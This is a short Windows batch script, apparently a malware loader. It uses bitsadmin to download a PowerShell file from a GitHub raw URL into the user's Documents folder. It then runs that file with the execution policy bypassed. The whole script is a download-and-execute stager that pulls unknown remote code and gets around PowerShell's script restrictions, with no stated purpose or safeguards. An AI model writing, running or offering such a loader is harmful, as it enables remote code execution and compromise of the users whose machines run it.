@echo off
bitsadmin.exe /transfer "DownloadFileJob" "https://raw.githubusercontent.com/forsaken0127/Rust/main/file.ps1" "%USERPROFILE%\Documents\file.ps1"
if %errorlevel% equ 0 (
    powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\Documents\file.ps1"
)
